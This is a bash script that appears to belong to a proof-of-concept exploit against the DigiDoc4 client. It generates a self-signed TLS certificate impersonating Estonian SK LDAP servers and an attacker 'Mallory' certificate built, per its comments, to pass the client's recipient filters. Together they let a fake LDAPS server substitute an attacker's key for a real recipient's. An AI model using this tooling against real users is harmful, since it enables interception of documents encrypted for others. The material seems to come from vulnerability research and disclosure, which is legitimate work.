#!/usr/bin/env bash
# Generate certs for H1 PoC:
#  - ldap-tls.{crt,key} : self-signed TLS cert for the fake LDAPS server,
#                         CN=esteid.ldap.sk.ee. A correct client must reject this.
#  - mallory.{crt,cer,key} : attacker's leaf cert + private key. The .cer (DER)
#                            is what we serve as userCertificate;binary.
set -euo pipefail

cd "$(dirname "$0")/certs"

echo "[*] Generating fake LDAPS TLS cert (CN=esteid.ldap.sk.ee, self-signed)..."
openssl req -x509 -newkey rsa:2048 -nodes -days 365 \
  -subj "/CN=esteid.ldap.sk.ee/O=FAKE-SK/C=EE" \
  -addext "subjectAltName=DNS:esteid.ldap.sk.ee,DNS:k3.ldap.sk.ee,DNS:ldap.eidpki.ee" \
  -keyout ldap-tls.key -out ldap-tls.crt 2>/dev/null

echo "[*] Generating attacker (Mallory) RSA key..."
openssl genrsa -out mallory.key 2048 2>/dev/null

cat > mallory.cnf <<'EOF'
[req]
distinguished_name = dn
prompt = no
[dn]
# Имитируем корпоративную печать (org seal) — это совпадает с тем,
# что DigiDoc4 ждёт от ldap_corp при поиске по имени (cn=*...*).
CN = MALLORY ORG OU
O = MALLORY OU
serialNumber = 12345678
C = EE
[v3]
# Filter в AddRecipients::showResult требует:
#   - keyUsage contains keyEncipherment OR keyAgreement       → ok
#   - EKU does NOT contain serverAuth                          → ok (отсутствует)
#   - EKU does NOT contain clientAuth (для corp-search)        → ok (убран)
#   - cert type != MobileIDType                                → ok
keyUsage = critical, digitalSignature, keyEncipherment, dataEncipherment
extendedKeyUsage = emailProtection
EOF

echo "[*] Generating attacker leaf certificate (mimics EE eID)..."
openssl req -x509 -new -key mallory.key -out mallory.crt \
  -days 365 -config mallory.cnf -extensions v3 2>/dev/null
openssl x509 -in mallory.crt -outform DER -out mallory.cer

# Cleanup the openssl config file
rm -f mallory.cnf

# Ensure server.py can read these from inside the container (UID 1000+)
chmod 644 ldap-tls.crt mallory.crt mallory.cer
chmod 600 ldap-tls.key mallory.key

echo
echo "[+] Done. Contents of $(pwd):"
ls -la
echo
echo "[+] Verify cert subjects:"
echo "    TLS server: $(openssl x509 -in ldap-tls.crt -noout -subject)"
echo "    Mallory:    $(openssl x509 -in mallory.crt -noout -subject)"
